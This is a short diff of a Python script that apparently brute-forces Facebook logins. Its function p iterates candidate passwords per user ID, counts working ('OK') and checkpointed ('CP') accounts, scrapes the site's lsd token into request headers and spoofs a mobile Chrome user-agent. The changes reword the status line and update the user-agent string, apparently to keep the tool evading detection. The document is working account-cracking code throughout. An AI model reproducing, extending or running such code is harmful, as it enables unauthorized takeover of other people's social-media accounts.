@@ -1893,7 +1893,7 @@ def p(uid,pwx,tl):
     global twf
     global loop
     global bkas
-    sys.stdout.write(f"\r {green}(M6--SUMON) ({loop}) (OK-{len(oks)}) (CP-{len(cps)}) (DIE-{len(die)}) (NV-{len(nv)})\r"),
+    sys.stdout.write(f"\r {green}(M2)-({loop})-(OK {len(oks)})-(CP {len(cps)})-(DIE {len(die)})-(NV {len(nv)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
@@ -1944,7 +1944,7 @@ def p(uid,pwx,tl):
             'sec-fetch-dest': 'empty',
             'sec-fetch-mode': 'cors',
             'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',
             'x-asbd-id': '129477',
             'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'x-requested-with': 'XMLHttpRequest',
